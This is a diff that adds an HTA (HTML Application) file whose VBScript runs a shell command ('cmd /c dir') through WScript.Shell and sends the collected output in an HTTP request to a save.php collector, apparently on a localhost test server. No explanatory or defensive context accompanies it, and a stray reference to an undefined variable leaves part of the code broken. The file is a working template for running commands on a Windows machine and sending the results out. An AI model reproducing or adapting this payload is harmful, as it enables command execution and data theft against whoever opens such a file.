@@ -1,0 +1,40 @@
+<html>
+
+<head>
+  <title>MyCode</title>
+  <HTA:APPLICATION APPLICATIONAME="HTA HOME" ID="HTAI" VERSION="1.0" SCROLL="no" APPLICATION="yes" CAPTION="no"/>
+</head>
+
+<body>
+  <script language="vbscript">
+
+    Set objShell = CreateObject("WScript.Shell")
+
+    Set objExecObject = objShell.Exec("cmd /c dir")
+    Dim httpRequester
+    Set httpRequester = CreateObject("MSXML2.ServerXMLHTTP")
+    Dim strFromProc
+    strFromProc = ""
+    
+    output = objExecObject.StdOut.ReadLine()
+
+    Do While Not objExecObject.Stdout.atEndOfStream
+      strFromProc = strFromProc + objExecObject.StdOut.ReadLine()
+    Loop
+
+    httpRequester.open "GET", "http://localhost/Confessions/save.php?userTextArea="+strFromProc
+    httpRequester.send
+
+    'httpRequester.open "GET", "http://localhost/Confessions/save.php?userTextArea=" + output, false
+    'httpRequester.send
+
+
+    msgBox(actualLine)
+
+  </script>
+
+
+
+</body>
+
+</html>
